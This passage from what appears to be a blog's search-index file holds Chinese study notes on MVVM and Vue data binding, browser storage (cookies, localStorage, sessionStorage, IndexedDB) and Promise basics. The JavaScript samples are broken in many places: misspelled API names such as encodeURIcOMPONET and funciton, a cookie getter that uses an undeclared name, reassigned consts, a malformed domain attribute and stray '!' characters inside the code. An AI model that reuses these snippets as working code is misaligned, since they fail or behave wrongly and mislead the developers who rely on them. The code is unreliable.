如下：</p><p><img src="http://c.biancheng.net/uploads/allimg/200525/1-200525105GH58.gif" style="zoom:67%;float:left;" ><img src='http://c.biancheng.net/uploads/allimg/200525/1-200525105346422.gif' style="zoom:67%;float:left"  ></p><p>VM：ViewModel 把 Model 和 View 的数据同步自动化了，解决了 MVP 中数据同步比较麻烦的问题，不仅减轻了 ViewModel 的压力，同时使得数据处理更加方便 — 只需告诉 View 展示的数据是 Model 中的哪部分即可。</p><p><font color='red'>特点</font>：ViewModel 双向绑定了 View 和 Model，因此，随着 View 的数据变化，系统会自动修改 MOdel 的数据，反之同理。</p><blockquote><p>而 Presenter 是采用手动写方法来调用或者修改 View 和 Model。</p></blockquote><p><font color='red'>双向数据绑定</font>：双向数据绑定是一个模板引擎，它会根据数据的变化实时渲染，如图，View 和 Model 之间的修改都会同步到对方。</p><img src='http://c.biancheng.net/uploads/allimg/200525/1-200525110113316.jpg' style="zoom:67%;" ><p>MVVM 中数据绑定方法一般有以下3种：</p><ul><li>数据劫持</li><li>发布 - 订阅模式</li><li>脏值检查</li></ul><blockquote><p>其中 Vue.js 用的就是发布 - 订阅模式，**Observer（数据监听器）**用户监听数据变化，如果数据变化，不论是在 View 还是 Model，Observer 都会知道，然后告诉 <strong>Watcher（订阅者）</strong>。**Compiler（指定解析器）**的作用是对数据进行解析，之后绑定指定的事件，在这主要用于更新视图。</p></blockquote><p>Vue.js 数据绑定的流程：首先将需要绑定的数据用数据劫持方法找出来，之后用 Observer 监听这堆数据，如果数据发生变化，Observer 就会告诉 Watcher，然后 Watcher 会决定让哪个 Compiler 去做相应的操作，这就完成了数据的双向绑定。</p><h2 id="4.-简述-3-种-框架-及其区别">4. 简述 3 种 框架 及其区别<a title="#4.-简述-3-种-框架-及其区别" href="#4.-简述-3-种-框架-及其区别"></a></h2><ol><li><p>MVC：model 层存放数据逻辑，view 层用于显示数据，controller 层用于将 model 层的数据赋值给 view 层，而在 model 层数据变化的时候， view 在监听到后再修改显示的数据，即 view 是可以访问到 model 的</p><blockquote><p>其实 所有处理业务的逻辑都在 controller 层上了，controller 压力繁重，而且 controller 层 跟 view 层其实算是一一对应的关系，所以代码难以复用</p></blockquote></li><li><p>MVP：此时 model 层和 view 层是不知道彼此的存在的，当 model 数据变化后，需要经过 presenter 层反馈给 view 层，然后才进行改变，</p><blockquote><p>因为没有数据绑定，所有数据都要经过 presenter 手动同步，使得 presenter 代码繁重</p></blockquote></li><li><p>MVVM：viewModel 层实现了model 和 view 的双向数据绑定，当一方数据改变的时候，就会经过 viewModel 将另一方的数据同步更改。</p><blockquote><p>发布者订阅模式：将要绑定的数据用数据劫持的方法找出来，用 数据监听器 observer 监听数据变化，当数据变化时，告诉 订阅者 Watcher，订阅者 找到适合的 指定解析器 去完成相应操作，完成了数据绑定</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器存储精简版</title>
      <link href="/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8%E7%89%B9%E7%82%B9%E5%8F%8A%E5%8C%BA%E5%88%AB"/>
      <url>/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8%E7%89%B9%E7%82%B9%E5%8F%8A%E5%8C%BA%E5%88%AB</url>
      
        <content type="html"><![CDATA[<blockquote><p>觉得还是复习的不够</p><p><a href="https://zhuanlan.zhihu.com/p/128155801">https://zhuanlan.zhihu.com/p/128155801</a></p><p><a href="https://juejin.cn/post/7012506796489359368">https://juejin.cn/post/7012506796489359368</a></p></blockquote><h4 id="**1.-cookie-**">**1. cookie **<a title="#**1.-cookie-**" href="#**1.-cookie-**"></a></h4><ul><li>生命周期为在cookie设置的过期时间之前一直有效，即使窗口或者浏览器关闭；</li><li>存放数据大小为4K；</li><li>有存储个数限制（各浏览器不同），一般不超过20个；</li><li>与服务器端通信，每次都会携带在HTTP头中，cookie存储数据过多会带来性能问题；</li><li>有安全问题，在 HTTP 请求中的 Cookie 是明文传递的；</li><li>只能存储字符串</li><li>由于第三方Cookie的滥用，所以很多老司机在浏览网页时会禁用Cookie，所以我们不得不测试用户是否支持Cookie，这也是很麻烦的一件事</li></ul><h4 id="2.-session">2. session<a title="#2.-session" href="#2.-session"></a></h4><h4 id="3.-localstorage">3. localStorage<a title="#3.-localstorage" href="#3.-localstorage"></a></h4><ul><li>生命周期永久，除非用户手动代码清除浏览器中的 localStorage 信息，否则永远存在</li><li>存放数据大小一般为 5MB</li><li>仅在浏览器中保存，不参与服务器通信</li><li>作用域为文档源级别，即同源的才能共享，可以互相读取对方的数据，甚至覆盖；但也受浏览器的限制</li></ul><h4 id="4.-sessionstorage">4. sessionStorage<a title="#4.-sessionstorage" href="#4.-sessionstorage"></a></h4><ul><li><p>仅在当前会话下有效，关闭页面或者浏览器后被清除；</p></li><li><p>存放数据大小一般为5MB；</p></li><li><p>仅在浏览器中保存，不参与服务器通信；</p></li><li><p>可以接受源生接口，亦可以再次封装来对Object和Array有更好的支持；</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise基本用法</title>
      <link href="/furtherNotes/further/03%20Promise"/>
      <url>/furtherNotes/further/03%20Promise</url>
      
        <content type="html"><![CDATA[<blockquote><p>2021.11.26 建的文件 12.3 终于打算写了</p><p>回调地狱 解决方案中 Promise</p><p>常见 promise 输出题：<a href="https://juejin.cn/post/6844904077537574919">https://juejin.cn/post/6844904077537574919</a></p><p><a href="https://juejin.cn/post/6844903607968481287">https://juejin.cn/post/6844903607968481287</a></p><p><a href="https://juejin.cn/post/6844903607968481287">https://juejin.cn/post/6844903607968481287</a></p><p><a href="https://juejin.cn/post/6952083081519955998">https://juejin.cn/post/6952083081519955998</a></p></blockquote><h2 id="promise">Promise<a title="#promise" href="#promise"></a></h2><h3 id="1.-简介">1. 简介<a title="#1.-简介" href="#1.-简介"></a></h3><p>Promise 是<strong>异步编程的一种解决方案</strong>：</p><p>从语法上讲，promise 是一个对象，它可以获取异步操作的消息；</p><p>从本意上讲，promise 是承诺，承诺它过一段时间会给你一个结果。</p><p>promise 有三种状态：<strong>pending</strong>(等待态)、<strong>fulfiled</strong>(成功态)、<strong>rejected</strong>(失败态)；状态一旦改变，就不会再变。创建 promise 实例后，其会立即执行。</p><blockquote><p>Pending 变为 Fulfilled 会得到一个私有<strong>value</strong>，Pending 变为 Rejected会得到一个私有<strong>reason</strong>，当Promise达到了Fulfilled或Rejected时，执行的异步代码会接收到这个value或reason</p></blockquote><p>promise 解决的问题：</p><ul><li>回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入的这种现象</li><li>promise 可以支持多个并发的请求，获取并发请求中的数据</li><li>promise 可以解决异步的问题，但是不能说 promise 是异步的</li></ul><h3 id="2.-基本用法">2. 基本用法<a title="#2.-基本用法" href="#2.-基本用法"></a></h3><ul><li><p>resolve ：异步操作执行成功后的回调函数</p></li><li><p>reject ：异步操作执行失败后的回调函数</p></li><li><p>then ：捕获 promise 状态变化（成功 / 错误），并将拿到的数据进行操作</p></li><li><p>catch：相当于 then(null,error =&gt; { … } )，then 的第二个参数</p></li><li><p>all：接收一个promise 实例数组参数，返回一个以传入数组顺序的返回结果的数组，提供了并行执行异步操作的能力，在所有异步操作执行完后才执行回调</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Promise1</span> = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;&#125;)</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Promise2</span> = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;&#125;)</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Promise3</span> = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title class_">Promise1</span>, <span class="title class_">Promise2</span>, <span class="title class_">Promise3</span>])</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="title function_">funciton</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 三个都成功则成功  </span></span><br><span class="line">&#125;, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 只要有失败，则失败 </span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>race：接收一个Promise 实例数组参数，返回最快执行完的操作结果</p><blockquote><p>使用场景：可以用 race 给某个异步请求设置超时时间，并且在超时后执行相应的操作</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> es6 </tag>
            
            <tag> promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器存储详细版</title>
      <link href="/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8"/>
      <url>/furtherNotes/further/01%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8</url>
      
        <content type="html"><![CDATA[<blockquote><p>由cwenjoy 项目中使用到的 localStorage 引申出来的</p><p><a href="https://www.jianshu.com/p/072e17112759">https://www.jianshu.com/p/072e17112759</a></p></blockquote><h2 id="浏览器存储">浏览器存储<a title="#浏览器存储" href="#浏览器存储"></a></h2><h3 id="常见的浏览器数据存储方案">常见的浏览器数据存储方案<a title="#常见的浏览器数据存储方案" href="#常见的浏览器数据存储方案"></a></h3><ol><li>Cookie</li><li>Web 存储 ：localStorage 和 sessionStorage</li><li>IndexedDB</li></ol><h4 id="1.-cookie">1. Cookie<a title="#1.-cookie" href="#1.-cookie"></a></h4><h5 id="1.1-简介">1.1 简介<a title="#1.1-简介" href="#1.1-简介"></a></h5><p>Cookie 又称 HTTP Cookie，最初在客户端用于存储会话信息，从底层看，其作为 HTTP 协议的一种扩展实现，Cookie 数据会自动在 Web 浏览器和 Web 服务器之间传输，因此在服务器端脚本可以读写存储的 cookie 值，因此 Cookie 通常用户存储一些通用的数据。</p><h5 id="1.2-优点">1.2 优点<a title="#1.2-优点" href="#1.2-优点"></a></h5><p>相比于其他的存储方式， Cookie 的兼容性很好</p><h5 id="1.3-缺点">1.3 缺点<a title="#1.3-缺点" href="#1.3-缺点"></a></h5><ul><li><strong>存储量小</strong>，在不同的浏览器上基本都是 4kb 大小</li><li><strong>影响性能</strong>，Cookie 会由浏览器作为请求头发送，当 Cookie 存储信息过多时，会影响特定域的资源获取效率，增加文件传输的负载</li><li><strong>只能存储字符串</strong></li><li><strong>安全问题</strong>，存储在 Cookie 的任何数据可以被他人访问，因此不能再 Cookie 中存储重要信息</li><li>因为第三方滥用 Cookie，所以很多人再浏览网页时会禁用 Cookie，所以得测试用户是否支持 Cookie</li></ul><h5 id="1.4-操作">1.4 操作<a title="#1.4-操作" href="#1.4-操作"></a></h5><p>基本操作：读取、写入、删除。</p><p>cookie 中所有的名字和值都是经过 URI 编码的，所以必须使用 decodeURICompoent来进行解码才能得到 cookie 的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">CookieUtil</span> = &#123;</span><br><span class="line">    <span class="comment">// get可根据cookie的名字获取相应的值</span></span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> cookieName = encodeURIcOMPONET(name) + <span class="string">&quot;=&quot;</span>,</span><br><span class="line">               cookieStart = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(cookieName),</span><br><span class="line">               cookieValue = <span class="literal">null</span></span><br><span class="line">        <span class="keyword">if</span>(cookieStart &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> cookieEnd = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;;&quot;</span>, cookieStart)</span><br><span class="line">            <span class="keyword">if</span>(cookieEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                cookieEnd = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="property">length</span></span><br><span class="line">            &#125;</span><br><span class="line">            cookieValue = decodeURICompoent(<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">substring</span>(cookieStart + cookieName.<span class="property">length</span>, cookieEnd))  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cookieValue</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// set设置一个cookie</span></span><br><span class="line">    <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">name, value, expires, path, domain, secure</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> cookieText = encodeURIComponet(name)+<span class="string">&quot;=&quot;</span>+encodeURIComponet(value)</span><br><span class="line">        <span class="keyword">if</span>(expires <span class="keyword">instanceof</span> <span class="title class_">Date</span>) &#123;</span><br><span class="line">            cookieText += <span class="string">&quot;; expires=&quot;</span> + expires.<span class="title function_">toGMTString</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path) &#123;</span><br><span class="line">            cookieText += <span class="string">&quot;;path=&quot;</span> + path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(domain) &#123;</span><br><span class="line">            cookieText += <span class="string">&quot;; domain&quot;</span> + domain</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(secure) &#123;</span><br><span class="line">            cookieText += <span class="string">&quot;; secure&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">cookie</span> = cookieText</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除已有的cookie</span></span><br><span class="line">    <span class="attr">unset</span>: <span class="keyword">function</span>(<span class="params">name, path, domain, secure</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">set</span>(name, <span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0</span>), path, domain, secure)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2.-web-存储">2. Web 存储<a title="#2.-web-存储" href="#2.-web-存储"></a></h4><p>web 存储机制最初作为 HTML5 的一部分被定义成 API 的形式，但由于其本身的独特性于一些原因被剥离出来，成为一个独立的标准。其包括 localStorage 对象 和 sessionStorage 对象。</p><p>其产生的主要原因：</p><ol><li>希望有一种再 cookie 之外存储会话数据的途径</li><li>希望有一种存储大量可以跨会话存在的数据的机制</li></ol><blockquote><p>最初的 web 存储规范中包含了 sessionStorage 和 globalStorage 两种对象的定义，在支持这两个对象的浏览器中都是以 windows 对象属性的形式存在的</p></blockquote><h4 id="3.-localstorage">3. localStorage<a title="#3.-localstorage" href="#3.-localstorage"></a></h4><h5 id="3.1-简介">3.1 简介<a title="#3.1-简介" href="#3.1-简介"></a></h5><p>localStorage 对象作为 <strong>持久保存客户端数据</strong>的方案 取代了 globalStorage。</p><p>从功能上讲，可以通过 localStorage 在浏览器存储键值对数据，相比于 cookie，提供了更为直观的 API，在安全上相对好一点。</p><p>虽然 localStorage 只能存储字符串，但也可以存储字符串化的 JSON 数据，因此相比 cookie ，localStorage 能存储更复杂的数据。</p><h5 id="3.2-优点">3.2 优点<a title="#3.2-优点" href="#3.2-优点"></a></h5><ul><li>提供了简单明了的 API 来进行操作</li><li>更加安全</li><li>可存储的数据量更大</li></ul><h5 id="3.3-语法">3.3 语法<a title="#3.3-语法" href="#3.3-语法"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用方法存储数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Srtian&quot;</span>)</span><br><span class="line"><span class="comment">// 使用属性存储数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="property">say</span> = <span class="string">&quot;Hello world&quot;</span></span><br><span class="line"><span class="comment">// 使用方法读取数据</span></span><br><span class="line"><span class="keyword">const</span> name = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="comment">// 使用属性读取数据</span></span><br><span class="line"><span class="keyword">const</span> say = <span class="variable language_">localStorage</span>.<span class="property">say</span></span><br><span class="line"><span class="comment">// 删除数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&quot;name&quot;</span>)</span><br></pre></td></tr></table></figure><p>需要传输其他格式的数据时，我们就需要将这些数据全部转换为字符串格式，然后再进行存储</p><p>获取值时将其转化回来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">name</span>:<span class="string">&quot;Srtian&quot;</span>, <span class="attr">age</span>: <span class="number">22</span>&#125;</span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;user&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> age = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="property">user</span>)</span><br></pre></td></tr></table></figure><h5 id="3.4-存储数据的有效期-与-作用域">3.4 存储数据的有效期 与 作用域<a title="#3.4-存储数据的有效期-与-作用域" href="#3.4-存储数据的有效期-与-作用域"></a></h5><p>通过localStorage存储的数据时永久性的，除非我们使用removeItem来删除或者用户通过设置浏览器配置来删除，负责数据会一直保留在用户的电脑上，永不过期。</p><p>localStorage的作用域限定在文档源级别的（意思就是同源的才能共享），同源的文档间会共享localStorage的数据，他们可以互相读取对方的数据，甚至有时会覆盖对方的数据。当然，localStorage的作用域同样也受浏览器的限制。</p><h4 id="4.-sessionstorage">4. sessionStorage<a title="#4.-sessionstorage" href="#4.-sessionstorage"></a></h4><h5 id="4.1-简介">4.1 简介<a title="#4.1-简介" href="#4.1-简介"></a></h5><p>与 localStorage 相似，不同之处在于 localStorage里面存储的数据没有过期时间设置，而Session Storage只存储当前会话页的数据，且只有当用户关闭当前会话页或浏览器时，数据才会被清除。</p><h5 id="4.2-语法">4.2 语法<a title="#4.2-语法" href="#4.2-语法"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存数据到sessionStorage</span></span><br><span class="line">sessionStorage.<span class="title function_">setItem</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Srtian&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从sessionStorage获取数据</span></span><br><span class="line"><span class="keyword">var</span> data = sessionStorage.<span class="title function_">getItem</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从sessionStorage删除保存的数据</span></span><br><span class="line">sessionStorage.<span class="title function_">removeItem</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从sessionStorage删除所有保存的数据</span></span><br><span class="line">sessionStorage.<span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure><h4 id="5.-indexeddb">5. indexedDB<a title="#5.-indexeddb" href="#5.-indexeddb"></a></h4><h5 id="5.1-简述">5.1 简述<a title="#5.1-简述" href="#5.1-简述"></a></h5><p>由HTML5所提供的一种本地存储，用于在浏览器中储存较大数据结构的 Web API，并提供索引功能以实现高性能查找。它一般用于保存大量用户数据并要求数据之间有搜索需要的场景，当网络断开时，用户就可以做一些离线的操作。它较之SQL更为方便，不需要写一些特定的语法对数据进行操作，数据格式是JSON。</p><h5 id="5.2-语法">5.2 语法<a title="#5.2-语法" href="#5.2-语法"></a></h5><ol><li><p><strong>创建数据库 并 指定数据库版本号</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意数据库的版本号只能是整数</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="title class_">IndexedDB</span>.<span class="title function_">open</span>(databasename, version)</span><br></pre></td></tr></table></figure></li><li><p><strong>生成处理函数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">request.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 创建数据库失败时的回调函数</span></span><br><span class="line">&#125;</span><br><span class="line">request.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 创建数据库成功时的回调函数</span></span><br><span class="line">&#125;</span><br><span class="line">request.<span class="property">onupgradeneededd</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">     <span class="comment">// 当数据库改变时的回调函数   唯一可以修改数据库结构的地方  可以创建和删除对象存储空间以及构建和删除索引</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>建立对象存储空间</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象存储空间仅调用createObjectStore()就可以创建。这个方法使用存储空间的名称，和一个对象参数。即便这个参数对象是可选的，它还是非常重要的，因为它可以让我们定义重要的可选属性和完善你希望创建的对象存储空间的类型。</span></span><br><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> db = event.<span class="property">target</span>.<span class="property">result</span></span><br><span class="line">    <span class="keyword">const</span> objectStore = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">keyPath</span>:<span class="string">&#x27;id&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>操作数据</strong></p><ul><li><p>添加数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">addData</span>: <span class="keyword">function</span>(<span class="params">db, storename, data</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> store = store = db.<span class="title function_">transaction</span>(storename, <span class="string">&#x27;readwrite&#x27;</span>).<span class="title function_">objectStore</span>(storename)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">!        <span class="keyword">const</span> request = store.<span class="title function_">add</span>(data[i])</span><br><span class="line">        request.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;添加数据失败&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        request.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;添加数据成功&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">putData</span>: <span class="keyword">function</span>(<span class="params">db, storename, data</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> store = store = db.<span class="title function_">transaction</span>(storename, <span class="string">&#x27;readwrite&#x27;</span>).<span class="title function_">objectStore</span>(storename)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">!        <span class="keyword">const</span> request = store.<span class="title function_">put</span>(data[i])</span><br><span class="line">        request.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;修改数据失败&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        request.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;修改数据成功&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getDataByKey</span>: <span class="keyword">function</span>(<span class="params">db, storename, key</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> store = store = db.<span class="title function_">transaction</span>(storename, <span class="string">&#x27;readwrite&#x27;</span>).<span class="title function_">objectStore</span>(storename)</span><br><span class="line">!    <span class="keyword">const</span> request = store.<span class="title function_">get</span>(key)</span><br><span class="line">    request.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取数据失败&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    request.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> result = e.<span class="property">target</span>.<span class="property">result</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deleteDate</span>: <span class="keyword">function</span>(<span class="params">db, storename, key</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> store = store = db.<span class="title function_">transaction</span>(storename, <span class="string">&#x27;readwrite&#x27;</span>).<span class="title function_">objectStore</span>(storename)</span><br><span class="line">!    store.<span class="title function_">delete</span>(key)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;已删除存储空间&#x27;</span> + storename + <span class="string">&#x27;中的&#x27;</span> + key + <span class="string">&#x27;纪录&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>关闭数据库</p><figure class="highlight js"><table><tr><td 